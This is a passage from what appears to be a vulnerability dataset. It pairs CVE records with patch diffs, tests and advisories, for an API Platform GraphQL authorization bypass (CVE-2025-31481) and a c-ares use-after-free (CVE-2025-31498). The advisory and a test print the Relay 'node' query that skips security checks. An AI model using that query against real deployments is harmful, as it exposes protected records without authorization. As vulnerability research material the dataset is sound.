$app->singleton(ResolverFactoryInterface::class, function (Application $app) {\n             return new ResolverFactory(\n                 $app->make('api_platform.graphql.state_provider.access_checker'),\n-                $app->make('api_platform.graphql.state_processor')\n+                $app->make('api_platform.graphql.state_processor'),\n+                $app->make('api_platform.graphql.runtime_operation_metadata_factory'),\n+            );\n+        });\n+\n+        $app->singleton('api_platform.graphql.runtime_operation_metadata_factory', function (Application $app) {\n+            return new RuntimeOperationMetadataFactory(\n+                $app->make(ResourceMetadataCollectionFactoryInterface::class),\n+                $app->make(UrlGeneratorRouter::class)\n             );\n         });\n```\n\nFilename: src/Metadata/Resource/Factory/OperationDefaultsTrait.php:\n```\n@@ -121,7 +121,7 @@\nprivate function getDefaultHttpOperations($resource): iterable\n \n     private function addDefaultGraphQlOperations(ApiResource $resource): ApiResource\n     {\n-        $operations = enum_exists($resource->getClass()) ? [new QueryCollection(paginationEnabled: false), new Query()] : [new QueryCollection(), new Query(), (new Mutation())->withName('update'), (new DeleteMutation())->withName('delete'), (new Mutation())->withName('create')];\n+        $operations = enum_exists($resource->getClass()) ? [new Query(), new QueryCollection(paginationEnabled: false)] : [new Query(), new QueryCollection(), (new Mutation())->withName('update'), (new DeleteMutation())->withName('delete'), (new Mutation())->withName('create')];\n         $graphQlOperations = [];\n         foreach ($operations as $operation) {\n             [$key, $operation] = $this->getOperationWithDefaults($resource, $operation);\n```\n\nFilename: src/Symfony/Bundle/Resources/config/graphql.xml:\n```\n@@ -187,6 +187,12 @@\n<service id=\"api_platform.graphql.resolver.factory\" class=\"ApiPlatform\\GraphQl\\Resolver\\Factory\\ResolverFactory\" public=\"false\">\n             <argument type=\"service\" id=\"api_platform.graphql.state_provider\" />\n             <argument type=\"service\" id=\"api_platform.graphql.state_processor\" />\n+            <argument type=\"service\" id=\"api_platform.graphql.runtime_operation_metadata_factory\" />\n+        </service>\n+\n+        <service id=\"api_platform.graphql.runtime_operation_metadata_factory\" class=\"ApiPlatform\\GraphQl\\Metadata\\RuntimeOperationMetadataFactory\" public=\"false\">\n+            <argument type=\"service\" id=\"api_platform.metadata.resource.metadata_collection_factory\" />\n+            <argument type=\"service\" id=\"api_platform.router\" />\n         </service>\n \n         <!-- Resolver Stages -->\n```\n\nFilename: tests/Functional/GraphQl/SecurityTest.php:\n```\n@@ -0,0 +1,116 @@\n+<?php\n+\n+/*\n+ * This file is part of the API Platform project.\n+ *\n+ * (c) K\u00e9vin Dunglas <dunglas@gmail.com>\n+ *\n+ * For the full copyright and license information, please view the LICENSE\n+ * file that was distributed with this source code.\n+ */\n+\n+declare(strict_types=1);\n+\n+namespace ApiPlatform\\Tests\\Functional\\GraphQl;\n+\n+use ApiPlatform\\Symfony\\Bundle\\Test\\ApiTestCase;\n+use ApiPlatform\\Tests\\Fixtures\\TestBundle\\Document\\SecuredDummy as DocumentSecuredDummy;\n+use ApiPlatform\\Tests\\Fixtures\\TestBundle\\Entity\\SecuredDummy;\n+use ApiPlatform\\Tests\\RecreateSchemaTrait;\n+use ApiPlatform\\Tests\\SetupClassResourcesTrait;\n+\n+final class SecurityTest extends ApiTestCase\n+{\n+    use RecreateSchemaTrait;\n+    use SetupClassResourcesTrait;\n+\n+    /**\n+     * @return class-string[]\n+     */\n+    public static function getResources(): array\n+    {\n+        return [SecuredDummy::class];\n+    }\n+\n+    public function testQueryItem(): void\n+    {\n+        $resource = $this->isMongoDB() ? DocumentSecuredDummy::class : SecuredDummy::class;\n+        $this->recreateSchema([$resource]);\n+        $this->loadFixtures($resource);\n+        $client = self::createClient();\n+        $response = $client->request('POST', '/graphql', ['json' => [\n+            'query' => <<<QUERY\n+    {\n+      securedDummy(id: \"/secured_dummies/1\") {\n+        title\n+        description\n+      }\n+    }\n+QUERY,\n+        ]]);\n+\n+        $d = $response->toArray();\n+        $this->assertEquals('Access Denied.', $d['errors'][0]['message']);\n+    }\n+\n+    public function testCreateItemUnauthorized(): void\n+    {\n+        $resource = $this->isMongoDB() ? DocumentSecuredDummy::class : SecuredDummy::class;\n+        $this->recreateSchema([$resource]);\n+        $client = self::createClient();\n+        $response = $client->request('POST', '/graphql', ['json' => [\n+            'query' => <<<QUERY\n+mutation {\n+    createSecuredDummy(input: {owner: \"me\", title: \"Hi\", description: \"Desc\", adminOnlyProperty: \"secret\", clientMutationId: \"auth\"}) {\n+        securedDummy {\n+            title\n+            owner\n+        }\n+    }\n+}\n+QUERY,\n+        ]]);\n+\n+        $d = $response->toArray();\n+        $this->assertEquals('Only admins can create a secured dummy.', $d['errors'][0]['message']);\n+    }\n+\n+    public function testQueryItemWithNode(): void\n+    {\n+        $resource = $this->isMongoDB() ? DocumentSecuredDummy::class : SecuredDummy::class;\n+        $this->recreateSchema([$resource]);\n+        $this->loadFixtures($resource);\n+        $client = self::createClient();\n+        $response = $client->request('POST', '/graphql', ['json' => [\n+            'query' => <<<QUERY\n+    {\n+      node(id: \"/secured_dummies/1\") {\n+        ... on SecuredDummy {\n+            title\n+        }\n+      }\n+    }\n+QUERY,\n+        ]]);\n+\n+        $d = $response->toArray();\n+        $this->assertEquals('Access Denied.', $d['errors'][0]['message']);\n+    }\n+\n+    public function loadFixtures(string $resourceClass): void\n+    {\n+        $container = static::$kernel->getContainer();\n+        $registry = $this->isMongoDB() ? $container->get('doctrine_mongodb') : $container->get('doctrine');\n+        $manager = $registry->getManager();\n+        $s = new $resourceClass();\n+        $s->setTitle('Secured Dummy 1');\n+        $s->setDescription('Description 1');\n+        $s->setAdminOnlyProperty('admin secret');\n+        $s->setOwnerOnlyProperty('owner secret');\n+        $s->setAttributeBasedProperty('attribute based secret');\n+        $s->setOwner('user1');\n+\n+        $manager->persist($s);\n+        $manager->flush();\n+    }\n+}\n```",
                "url": "https://github.com/api-platform/core/commit/60747cc8c2fb855798c923b5537888f8d0969568"
            }
        ],
        "published_date": "2025-04-03T19:20:22.916Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\napi-platform\n/\ncore\nPublic\nSponsor\nNotifications You must be signed in to change notification settings\nFork 906\nStar 2.5k\nCode\nIssues\n170\nPull requests\n48\nDiscussions\nActions\nProjects\nWiki\nSecurity\n5\nInsights\nAdditional navigation options\nGraphQL query operations security can be bypassed\nHigh soyuka published GHSA-cg3c-245w-728m on Apr 3Apr 3, 2025\nPackage\ncomposer api-platform/core\n(\nComposer\n)\nAffected versions\n<4.0.21\n<3.4.16\nPatched versions\n4.0.22\n3.4.17\ncomposer api-platform/graphql\n(\nComposer\n)\n<4.0.21\n<3.4.16\n4.0.22\n3.4.17\nDescription\nSummary\nUsing the Relay special node type you can bypass the configured security on an operation.\nDetails\nHere is an example of how to apply security configurations for the GraphQL operations:\n#[ApiResource(\n    security: \"is_granted('ROLE_USER')\",\n    operations: [ /* ... */ ],\n    graphQlOperations: [\n        new Query(security: \"is_granted('ROLE_USER')\"),\n        //...\n    ],\n)]\nclass Book { /* ... */ }\nThis indeed checks is_granted('ROLE_USER') as expected for a GraphQL query like the following:\n\u200cquery {\n    book(id: \"/books/1\") {\n        title\n    }\n}\nBut the security check can be bypassed by using the node field (that is available by default) on the root query type like that:\n\u200cquery {\n    node(id: \"/books/1\") {\n        ... on Book {\n            title\n        }\n    }\n}\nThis does not execute any security checks and can therefore be used to access any entity without restrictions by everyone that has access to the API.\nImpact\nEveryone using GraphQl with the security attribute. Not sure whereas this works with custom resolvers nor if this also applies on mutation.\nPatched at 60747cc\nSeverity\nHigh\n7.5\n/ 10\nCVSS v3 base metrics\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nLearn more about base metrics\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N\nCVE ID\nCVE-2025-31481\nWeaknesses\nNo CWEs\nCredits\nsoyuka\nRemediation developer\nausi\nReporter\nalanpoulain\nRemediation reviewer\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory includes specific example GraphQL queries demonstrating the vulnerability.",
                "url": "https://github.com/api-platform/core/security/advisories/GHSA-cg3c-245w-728m"
            }
        ],
        "sw_version": "v4.0.0",
        "sw_version_wget": "https://github.com/api-platform/core/archive/refs/tags/v4.0.0.zip"
    },
    "CVE-2025-31498": {
        "cwe": [
            {
                "id": "CWE-416",
                "value": "CWE-416: Use After Free"
            }
        ],
        "description": "c-ares is an asynchronous resolver library. From 1.32.3 through 1.34.4, there is a use-after-free in read_answers() when process_answer() may re-enqueue a query either due to a DNS Cookie Failure or when the upstream server does not properly support EDNS, or possibly on TCP queries if the remote closed the connection immediately after a response. If there was an issue trying to put that new transaction on the wire, it would close the connection handle, but read_answers() was still expecting the connection handle to be available to possibly dequeue other responses. In theory a remote attacker might be able to trigger this by flooding the target with ICMP UNREACHABLE packets if they also control the upstream nameserver and can return a result with one of those conditions, this has been untested. Otherwise only a local attacker might be able to change system behavior to make send()/write() return a failure condition. This vulnerability is fixed in 1.34.5.",
        "languages": [
            "C"
        ],
        "patch_commits": [
            {
                "content": "Merge commit from fork\n\nAt no point should a resend occur directly during answer parsing.\nIt needs to be queued up to be processed after all the answers\nare taken off the wire to re-send any queries.  Because immediate\nresending can hit error conditions that can cause the conneciton\nto be closed this needs to be avoided at all costs.\n\nThis patch simply introduces a queue of queries to be resent which\nwill then be sent after all answers are processed when the\nconnection handle is no longer needed.\n\nSigned-off-by: Brad House (@bradh352)\n\nSigned-off-by: Brad House (@bradh352)\n\nFilename: src/lib/ares_close_sockets.c:\n```\n@@ -37,7 +37,7 @@\nstatic void ares_requeue_queries(ares_conn_t  *conn,\n   ares_tvnow(&now);\n \n   while ((query = ares_llist_first_val(conn->queries_to_conn)) != NULL) {\n-    ares_requeue_query(query, &now, requeue_status, ARES_TRUE, NULL);\n+    ares_requeue_query(query, &now, requeue_status, ARES_TRUE, NULL, NULL);\n   }\n }\n```\n\nFilename: src/lib/ares_cookie.c:\n```\n@@ -369,7 +369,8 @@\nares_status_t ares_cookie_apply(ares_dns_record_t *dnsrec, ares_conn_t *conn,\n \n ares_status_t ares_cookie_validate(ares_query_t            *query,\n                                    const ares_dns_record_t *dnsresp,\n-                                   ares_conn_t *conn, const ares_timeval_t *now)\n+                                   ares_conn_t *conn, const ares_timeval_t *now,\n+                                   ares_array_t **requeue)\n {\n   ares_server_t           *server = conn->server;\n   ares_cookie_t           *cookie = &server->cookie;\n\n@@ -427,7 +428,8 @@\nares_status_t ares_cookie_validate(ares_query_t            *query,\n     /* Resend the request, hopefully it will work the next time as we should\n      * have recorded a server cookie */\n     ares_requeue_query(query, now, ARES_SUCCESS,\n-                       ARES_FALSE /* Don't increment try count */, NULL);\n+                       ARES_FALSE /* Don't increment try count */, NULL,\n+                       requeue);\n \n     /* Parent needs to drop this response */\n     return ARES_EBADRESP;\n```\n\nFilename: src/lib/ares_private.h:\n```\n@@ -321,7 +321,8 @@\nares_status_t ares_send_query(ares_server_t *requested_server /* Optional */,\n ares_status_t ares_requeue_query(ares_query_t *query, const ares_timeval_t *now,\n                                  ares_status_t            status,\n                                  ares_bool_t              inc_try_count,\n-                                 const ares_dns_record_t *dnsrec);\n+                                 const ares_dns_record_t *dnsrec,\n+                                 ares_array_t           **requeue);\n \n /*! Count the number of labels (dots+1) in a domain */\n size_t        ares_name_label_cnt(const char *name);\n\n@@ -612,7 +613,8 @@\nares_status_t ares_cookie_apply(ares_dns_record_t *dnsrec, ares_conn_t *conn,\n ares_status_t ares_cookie_validate(ares_query_t            *query,\n                                    const ares_dns_record_t *dnsresp,\n                                    ares_conn_t             *conn,\n-                                   const ares_timeval_t    *now);\n+                                   const ares_timeval_t    *now,\n+                                   ares_array_t           **requeue);\n \n ares_status_t ares_channel_threading_init(ares_channel_t *channel);\n void          ares_channel_threading_destroy(ares_channel_t *channel);\n```\n\nFilename: src/lib/ares_process.c:\n```\n@@ -56,7 +56,8 @@\nstatic ares_status_t process_timeouts(ares_channel_t       *channel,\n static ares_status_t process_answer(ares_channel_t      *channel,\n                                     const unsigned char *abuf, size_t alen,\n                                     ares_conn_t          *conn,\n-                                    const ares_timeval_t *now);\n+                                    const ares_timeval_t *now,\n+                                    ares_array_t        **requeue);\n static void handle_conn_error(ares_conn_t *conn, ares_bool_t critical_failure,\n                               ares_status_t failure_status);\n static ares_bool_t same_questions(const ares_query_t      *query,\n\n@@ -510,10 +511,38 @@\nstatic ares_status_t read_conn_packets(ares_conn_t *conn)\n   return ARES_SUCCESS;\n }\n \n+/* Simple data structure to store a query that needs to be requeued with\n+ * optional server */\n+typedef struct {\n+  unsigned short qid;\n+  ares_server_t *server; /* optional */\n+} ares_requeue_t;\n+\n+static ares_status_t ares_append_requeue(ares_array_t **requeue,\n+                                         ares_query_t *query,\n+                                         ares_server_t *server)\n+{\n+  ares_requeue_t entry;\n+\n+  if (*requeue == NULL) {\n+    *requeue = ares_array_create(sizeof(ares_requeue_t), NULL);\n+    if (*requeue == NULL) {\n+      return ARES_ENOMEM;\n+    }\n+  }\n+\n+  ares_query_remove_from_conn(query);\n+\n+  entry.qid    = query->qid;\n+  entry.server = server;\n+  return ares_array_insertdata_last(*requeue, &entry);\n+}\n+\n static ares_status_t read_answers(ares_conn_t *conn, const ares_timeval_t *now)\n {\n   ares_status_t   status;\n   ares_channel_t *channel = conn->server->channel;\n+  ares_array_t   *requeue = NULL;\n \n   /* Process all queued answers */\n   while (1) {\n\n@@ -550,15 +579,43 @@\nstatic ares_status_t read_answers(ares_conn_t *conn, const ares_timeval_t *now)\n     data_len -= 2;\n \n     /* We finished reading this answer; process it */\n-    status = process_answer(channel, data, data_len, conn, now);\n+    status = process_answer(channel, data, data_len, conn, now, &requeue);\n     if (status != ARES_SUCCESS) {\n       handle_conn_error(conn, ARES_TRUE, status);\n-      return status;\n+      goto cleanup;\n     }\n \n     /* Since we processed the answer, clear the tag so space can be reclaimed */\n     ares_buf_tag_clear(conn->in_buf);\n   }\n+\n+cleanup:\n+\n+  /* Flush requeue */\n+  while (ares_array_len(requeue) > 0) {\n+    ares_query_t  *query;\n+    ares_requeue_t entry;\n+    ares_status_t  internal_status;\n+\n+    internal_status = ares_array_claim_at(&entry, sizeof(entry), requeue, 0);\n+    if (internal_status != ARES_SUCCESS) {\n+      break;\n+    }\n+\n+    /* Query disappeared */\n+    query = ares_htable_szvp_get_direct(channel->queries_by_qid, entry.qid);\n+    if (query == NULL) {\n+      continue;\n+    }\n+\n+    internal_status = ares_send_query(entry.server, query, now);\n+    /* We only care about ARES_ENOMEM */\n+    if (internal_status == ARES_ENOMEM) {\n+      status = ARES_ENOMEM;\n+    }\n+  }\n+  ares_array_destroy(requeue);\n+\n   return status;\n }\n\n@@ -611,7 +668,8 @@\nstatic ares_status_t process_timeouts(ares_channel_t       *channel,\n \n     conn = query->conn;\n     server_increment_failures(conn->server, query->using_tcp);\n-    status = ares_requeue_query(query, now, ARES_ETIMEOUT, ARES_TRUE, NULL);\n+    status = ares_requeue_query(query, now, ARES_ETIMEOUT, ARES_TRUE, NULL,\n+                                NULL);\n     if (status == ARES_ENOMEM) {\n       goto done;\n     }\n\n@@ -701,7 +759,8 @@\nstatic ares_bool_t issue_might_be_edns(const ares_dns_record_t *req,\n static ares_status_t process_answer(ares_channel_t      *channel,\n                                     const unsigned char *abuf, size_t alen,\n                                     ares_conn_t          *conn,\n-                                    const ares_timeval_t *now)\n+                                    const ares_timeval_t *now,\n+                                    ares_array_t        **requeue)\n {\n   ares_query_t      *query;\n   /* Cache these as once ares_send_query() gets called, it may end up\n\n@@ -745,7 +804,8 @@\nstatic ares_status_t process_answer(ares_channel_t      *channel,\n \n   /* Validate DNS cookie in response. This function may need to requeue the\n    * query. */\n-  if (ares_cookie_validate(query, rdnsrec, conn, now) != ARES_SUCCESS) {\n+  if (ares_cookie_validate(query, rdnsrec, conn, now, requeue)\n+      != ARES_SUCCESS) {\n     /* Drop response and return */\n     status = ARES_SUCCESS;\n     goto cleanup;\n\n@@ -768,9 +828,8 @@\nstatic ares_status_t process_answer(ares_channel_t      *channel,\n       goto cleanup;\n     }\n \n-    /* Send to same server */\n-    ares_send_query(server, query, now);\n-    status = ARES_SUCCESS;\n+    /* Requeue to same server */\n+    status = ares_append_requeue(requeue, query, server);\n     goto cleanup;\n   }\n\n@@ -782,8 +841,9 @@\nstatic ares_status_t process_answer(ares_channel_t      *channel,\n       !(conn->flags & ARES_CONN_FLAG_TCP) &&\n       !(channel->flags & ARES_FLAG_IGNTC)) {\n     query->using_tcp = ARES_TRUE;\n-    ares_send_query(NULL, query, now);\n-    status = ARES_SUCCESS; /* Switched to TCP is ok */\n+    status = ares_append_requeue(requeue, query, NULL);\n+    /* Status will reflect success except on memory error, which is good since\n+     * requeuing to TCP is ok */\n     goto cleanup;\n   }\n\n@@ -809,11 +869,13 @@\nstatic ares_status_t process_answer(ares_channel_t      *channel,\n       }\n \n       server_increment_failures(server, query->using_tcp);\n-      ares_requeue_query(query, now, status, ARES_TRUE, rdnsrec);\n+      status = ares_requeue_query(query, now, status, ARES_TRUE, rdnsrec, requeue);\n \n-      /* Should any of these cause a connection termination?\n-       * Maybe SERVER_FAILURE? */\n-      status = ARES_SUCCESS;\n+      if (status != ARES_ENOMEM) {\n+        /* Should any of these cause a connection termination?\n+         * Maybe SERVER_FAILURE? */\n+        status = ARES_SUCCESS;\n+      }\n       goto cleanup;\n     }\n   }\n\n@@ -854,10 +916,14 @@\nstatic void handle_conn_error(ares_conn_t *conn, ares_bool_t critical_failure,\n   ares_close_connection(conn, failure_status);\n }\n \n+/* Requeue query will normally call ares_send_query() but in some circumstances\n+ * this needs to be delayed, so if requeue is not NULL, it will add the query\n+ * to the queue instead */\n ares_status_t ares_requeue_query(ares_query_t *query, const ares_timeval_t *now,\n                                  ares_status_t            status,\n                                  ares_bool_t              inc_try_count,\n-                                 const ares_dns_record_t *dnsrec)\n+                                 const ares_dns_record_t *dnsrec,\n+                                 ares_array_t           **requeue)\n {\n   ares_channel_t *channel   = query->channel;\n   size_t          max_tries = ares_slist_len(channel->servers) * channel->tries;\n\n@@ -873,6 +939,9 @@\nares_status_t ares_requeue_query(ares_query_t *query, const ares_timeval_t *now,\n   }\n \n   if (query->try_count < max_tries && !query->no_retries) {\n+    if (requeue != NULL) {\n+      return ares_append_requeue(requeue, query, NULL);\n+    }\n     return ares_send_query(NULL, query, now);\n   }\n\n@@ -1187,7 +1256,7 @@\nares_status_t ares_send_query(ares_server_t *requested_server,\n       case ARES_ECONNREFUSED:\n       case ARES_EBADFAMILY:\n         server_increment_failures(server, query->using_tcp);\n-        return ares_requeue_query(query, now, status, ARES_TRUE, NULL);\n+        return ares_requeue_query(query, now, status, ARES_TRUE, NULL, NULL);\n \n       /* Anything else is not retryable, likely ENOMEM */\n       default:\n\n@@ -1213,15 +1282,15 @@\nares_status_t ares_send_query(ares_server_t *requested_server,\n     case ARES_ECONNREFUSED:\n     case ARES_EBADFAMILY:\n       handle_conn_error(conn, ARES_TRUE, status);\n-      status = ares_requeue_query(query, now, status, ARES_TRUE, NULL);\n+      status = ares_requeue_query(query, now, status, ARES_TRUE, NULL, NULL);\n       if (status == ARES_ETIMEOUT) {\n         status = ARES_ECONNREFUSED;\n       }\n       return status;\n \n     default:\n       server_increment_failures(server, query->using_tcp);\n-      status = ares_requeue_query(query, now, status, ARES_TRUE, NULL);\n+      status = ares_requeue_query(query, now, status, ARES_TRUE, NULL, NULL);\n       return status;\n   }\n```\n\nFilename: test/ares-test-mock-ai.cc:\n```\n@@ -713,6 +713,100 @@\nTEST_P(MockChannelTestAI, FamilyUnspecified) {\n   EXPECT_THAT(result.ai_, IncludesV6Address(\"2121:0000:0000:0000:0000:0000:0000:0303\"));\n }\n \n+\n+TEST_P(MockChannelTestAI, TriggerResendThenConnFailSERVFAIL) {\n+  // Set up the server response. The server always returns SERVFAIL.\n+  DNSPacket badrsp4;\n+  badrsp4.set_response().set_aa().set_rcode(SERVFAIL)\n+    .add_question(new DNSQuestion(\"www.google.com\", T_A));\n+  DNSPacket goodrsp4;\n+  goodrsp4.set_response().set_aa()\n+    .add_question(new DNSQuestion(\"www.google.com\", T_A))\n+    .add_answer(new DNSARR(\"www.google.com\", 0x0100, {0x01, 0x02, 0x03, 0x04}));\n+\n+  DNSPacket goodrsp6;\n+  goodrsp6.set_response().set_aa()\n+    .add_question(new DNSQuestion(\"www.google.com\", T_AAAA))\n+    .add_answer(new DNSAaaaRR(\"www.google.com\", 100,\n+                              {0x21, 0x21, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n+                               0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x03}));\n+\n+  EXPECT_CALL(server_, OnRequest(\"www.google.com\", T_A))\n+    .WillOnce(SetReplyAndFailSend(&server_, &badrsp4))\n+    .WillOnce(SetReply(&server_, &goodrsp4));\n+\n+  EXPECT_CALL(server_, OnRequest(\"www.google.com\", T_AAAA))\n+    .WillRepeatedly(SetReply(&server_, &goodrsp6));\n+\n+  ares_socket_functions sock_funcs;\n+  memset(&sock_funcs, 0, sizeof(sock_funcs));\n+\n+  sock_funcs.asendv = ares_sendv_fail;\n+\n+  ares_set_socket_functions(channel_, &sock_funcs, NULL);\n+\n+  AddrInfoResult result;\n+  struct ares_addrinfo_hints hints = {0, 0, 0, 0};\n+  hints.ai_family = AF_UNSPEC;\n+  hints.ai_flags = ARES_AI_NOSORT;\n+  ares_getaddrinfo(channel_, \"www.google.com.\", NULL, &hints,\n+                   AddrInfoCallback, &result);\n+\n+  Process();\n+  EXPECT_TRUE(result.done_);\n+  EXPECT_TRUE(result.done_);\n+  EXPECT_THAT(result.ai_, IncludesNumAddresses(2));\n+  EXPECT_THAT(result.ai_, IncludesV4Address(\"1.2.3.4\"));\n+  EXPECT_THAT(result.ai_, IncludesV6Address(\"2121:0000:0000:0000:0000:0000:0000:0303\"));\n+}\n+\n+TEST_P(MockUDPChannelTestAI, TriggerResendThenConnFailEDNS) {\n+  // Set up the server response to simulate an EDNS failure\n+ DNSPacket badrsp4;\n+  badrsp4.set_response().set_aa().set_rcode(FORMERR)\n+    .add_question(new DNSQuestion(\"www.google.com\", T_A));\n+  DNSPacket goodrsp4;\n+  goodrsp4.set_response().set_aa()\n+    .add_question(new DNSQuestion(\"www.google.com\", T_A))\n+    .add_answer(new DNSARR(\"www.google.com\", 0x0100, {0x01, 0x02, 0x03, 0x04}));\n+  DNSPacket goodrsp6;\n+  goodrsp6.set_response().set_aa()\n+    .add_question(new DNSQuestion(\"www.google.com\", T_AAAA))\n+    .add_answer(new DNSAaaaRR(\"www.google.com\", 100,\n+                              {0x21, 0x21, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n+                               0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x03}));\n+\n+  EXPECT_CALL(server_, OnRequest(\"www.google.com\", T_A))\n+    .WillOnce(SetReplyAndFailSend(&server_, &badrsp4))\n+    .WillOnce(SetReply(&server_, &goodrsp4));\n+\n+  EXPECT_CALL(server_, OnRequest(\"www.google.com\", T_AAAA))\n+    .WillRepeatedly(SetReply(&server_, &goodrsp6));\n+\n+  ares_socket_functions sock_funcs;\n+  memset(&sock_funcs, 0, sizeof(sock_funcs));\n+\n+  sock_funcs.asendv = ares_sendv_fail;\n+\n+  ares_set_socket_functions(channel_, &sock_funcs, NULL);\n+\n+  AddrInfoResult result;\n+  struct ares_addrinfo_hints hints = {0, 0, 0, 0};\n+  hints.ai_family = AF_UNSPEC;\n+  hints.ai_flags = ARES_AI_NOSORT;\n+  ares_getaddrinfo(channel_, \"www.google.com.\", NULL, &hints,\n+                   AddrInfoCallback, &result);\n+\n+  Process();\n+  EXPECT_TRUE(result.done_);\n+  EXPECT_TRUE(result.done_);\n+  EXPECT_THAT(result.ai_, IncludesNumAddresses(2));\n+  EXPECT_THAT(result.ai_, IncludesV4Address(\"1.2.3.4\"));\n+  EXPECT_THAT(result.ai_, IncludesV6Address(\"2121:0000:0000:0000:0000:0000:0000:0303\"));\n+}\n+\n+\n+\n class MockEDNSChannelTestAI : public MockFlagsChannelOptsTestAI {\n  public:\n   MockEDNSChannelTestAI() : MockFlagsChannelOptsTestAI(ARES_FLAG_EDNS) {}\n```\n\nFilename: test/ares-test-mock.cc:\n```\n@@ -1662,6 +1662,66 @@\nTEST_P(MockChannelTest, GetHostByAddrDestroy) {\n   EXPECT_EQ(0, result.timeouts_);\n }\n \n+TEST_P(MockChannelTest, TriggerResendThenConnFailSERVFAIL) {\n+  // Set up the server response. The server always returns SERVFAIL.\n+  DNSPacket badrsp;\n+  badrsp.set_response().set_aa().set_rcode(SERVFAIL)\n+    .add_question(new DNSQuestion(\"www.google.com\", T_A));\n+  DNSPacket goodrsp;\n+  goodrsp.set_response().set_aa()\n+    .add_question(new DNSQuestion(\"www.google.com\", T_A))\n+    .add_answer(new DNSARR(\"www.google.com\", 0x0100, {0x01, 0x02, 0x03, 0x04}));\n+  EXPECT_CALL(server_, OnRequest(\"www.google.com\", T_A))\n+    .WillOnce(SetReplyAndFailSend(&server_, &badrsp))\n+    .WillOnce(SetReply(&server_, &goodrsp));\n+\n+  ares_socket_functions sock_funcs;\n+  memset(&sock_funcs, 0, sizeof(sock_funcs));\n+\n+  sock_funcs.asendv = ares_sendv_fail;\n+\n+  ares_set_socket_functions(channel_, &sock_funcs, NULL);\n+\n+  HostResult result;\n+  ares_gethostbyname(channel_, \"www.google.com.\", AF_INET, HostCallback,\n+                     &result);\n+  Process();\n+  EXPECT_TRUE(result.done_);\n+  std::stringstream ss;\n+  ss << result.host_;\n+  EXPECT_EQ(\"{'www.google.com' aliases=[] addrs=[1.2.3.4]}\", ss.str());\n+}\n+\n+TEST_P(MockUDPChannelTest, TriggerResendThenConnFailEDNS) {\n+  // Set up the server response to simulate an EDNS failure\n+  DNSPacket badrsp;\n+  badrsp.set_response().set_aa().set_rcode(FORMERR)\n+    .add_question(new DNSQuestion(\"www.google.com\", T_A));\n+  DNSPacket goodrsp;\n+  goodrsp.set_response().set_aa()\n+    .add_question(new DNSQuestion(\"www.google.com\", T_A))\n+    .add_answer(new DNSARR(\"www.google.com\", 0x0100, {0x01, 0x02, 0x03, 0x04}));\n+  EXPECT_CALL(server_, OnRequest(\"www.google.com\", T_A))\n+    .WillOnce(SetReplyAndFailSend(&server_, &badrsp))\n+    .WillOnce(SetReply(&server_, &goodrsp));\n+\n+  ares_socket_functions sock_funcs;\n+  memset(&sock_funcs, 0, sizeof(sock_funcs));\n+\n+  sock_funcs.asendv = ares_sendv_fail;\n+\n+  ares_set_socket_functions(channel_, &sock_funcs, NULL);\n+\n+  HostResult result;\n+  ares_gethostbyname(channel_, \"www.google.com.\", AF_INET, HostCallback,\n+                     &result);\n+  Process();\n+  EXPECT_TRUE(result.done_);\n+  std::stringstream ss;\n+  ss << result.host_;\n+  EXPECT_EQ(\"{'www.google.com' aliases=[] addrs=[1.2.3.4]}\", ss.str());\n+}\n+\n TEST_P(MockUDPChannelTest, GetSock) {\n   DNSPacket reply;\n   reply.set_response().set_aa()\n```\n\nFilename: test/ares-test.cc:\n```\n@@ -250,6 +250,7 @@\nstd::vector<std::pair<int, bool>> families_modes = both_families_both_modes;\n unsigned long long LibraryTest::fails_ = 0;\n std::map<size_t, int> LibraryTest::size_fails_;\n std::mutex            LibraryTest::lock_;\n+bool LibraryTest::failsend_ = false;\n \n void ares_sleep_time(unsigned int ms)\n {\n\n@@ -340,7 +341,29 @@\nvoid ProcessWork(ares_channel_t *channel,\n }\n \n \n+void LibraryTest::SetFailSend() {\n+  failsend_ = true;\n+}\n+\n // static\n+ares_ssize_t LibraryTest::ares_sendv_fail(ares_socket_t socket, const struct iovec *vec, int len, void *user_data)\n+{\n+  (void)user_data;\n+\n+  if (failsend_) {\n+#ifdef USE_WINSOCK\n+    WSASetLastError(WSAECONNREFUSED)\n+#else\n+    errno = ECONNREFUSED;\n+#endif\n+    failsend_ = false;\n+    return -1;\n+  }\n+\n+  return send(socket, vec[0].iov_base, vec[0].iov_len, 0);\n+}\n+\n+\n void LibraryTest::SetAllocFail(int nth) {\n   lock_.lock();\n   assert(nth > 0);\n\n@@ -684,6 +707,7 @@\nvoid MockServer::ProcessRequest(ares_socket_t fd, struct sockaddr_storage* addr,\n   /* DNS 0x20 will mix case, do case-insensitive matching of name in request */\n   char lower_name[256];\n   int flags = 0;\n+\n   arestest_strtolower(lower_name, name, sizeof(lower_name));\n \n   // Before processing, let gMock know the request is happening.\n\n@@ -745,10 +769,11 @@\nvoid MockServer::ProcessRequest(ares_socket_t fd, struct sockaddr_storage* addr,\n #endif\n \n   ares_ssize_t rc = (ares_ssize_t)sendto(fd, BYTE_CAST reply.data(), (SEND_TYPE_ARG3)reply.size(), flags,\n-                  (struct sockaddr *)addr, addrlen);\n+                                         (struct sockaddr *)addr, addrlen);\n   if (rc < static_cast<ares_ssize_t>(reply.size())) {\n     std::cerr << \"Failed to send full reply, rc=\" << rc << std::endl;\n   }\n+\n }\n \n // static\n```\n\nFilename: test/ares-test.h:\n```\n@@ -140,11 +140,17 @@\nclass LibraryTest : public ::testing::Test {\n   static void *arealloc(void *ptr, size_t size);\n   static void  afree(void *ptr);\n \n+  static void SetFailSend(void);\n+  static ares_ssize_t ares_sendv_fail(ares_socket_t socket, const struct iovec *vec, int len,\n+                                      void *user_data);\n+\n+\n private:\n   static bool                  ShouldAllocFail(size_t 